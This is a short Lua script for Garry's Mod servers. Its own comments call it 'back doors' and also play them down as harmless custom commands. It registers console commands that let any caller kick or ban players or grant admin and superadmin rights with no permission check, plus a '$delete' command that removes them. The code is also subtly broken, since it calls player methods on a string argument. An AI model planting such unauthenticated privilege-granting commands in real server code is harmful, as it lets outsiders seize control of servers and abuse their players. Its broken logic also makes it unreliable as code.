-- you must make the back doors to understand the back doors
-- tbh these arn't even back door really they're just custom commands that dont need admin :)

local function kickPlr(plr, cmd, args)
    -- check if the argument is empty, if not then is a string, if so then is a player
    if (args[1] != nil and type(args[1]) == "string" and args[1].GetByID(1):IsPlayer() == true) then
        -- executes the command
        args[1]:Kick()
    end
end

local function banPlr(plr, cmd, args)
    -- check if the argument is empty, if not then is a string, if so then is a player
    if (args[1] != nil and type(args[1]) == "string" and args[1].GetByID(1):IsPlayer() == true) then
        -- executes the command
        args[1]:Ban()
    end
end

local function addAdmin(plr, cmd, args)
    -- check if the argument is empty, if not then is a string, if so then is a player
    if (args[1] != nil and type(args[1]) == "string" and args[1].GetByID(1):IsPlayer() == true) then
        -- executes the command
        args[1]:SetUserGroup("admin")
    end
end

local function addSAdmin(plr, cmd, args)
    -- check if the argument is empty, if not then is a string, if so then is a player
    if (args[1] != nil and type(args[1]) == "string" and args[1].GetByID(1):IsPlayer() == true) then
        -- executes the command
        args[1]:SetUserGroup("superadmin")
    end
end

concommand.Add("$ForceKick", kickPlr)
concommand.Add("$ForceBan", banPlr)
concommand.Add("$ForceAddAdmin", addAdmin)
concommand.Add("$ForceAddSAdmin", addSAdmin)

local function SHUTDOWN_OPERATION(plr, cmd, args)
    concommand.Remove("$ForceKick")
    concommand.Remove("$ForceBan")
    concommand.Remove("$ForceAddAdmin")
    concommand.Remove("$ForceAddSAdmin")
end

concommand.Add("$delete", SHUTDOWN_OPERATION)
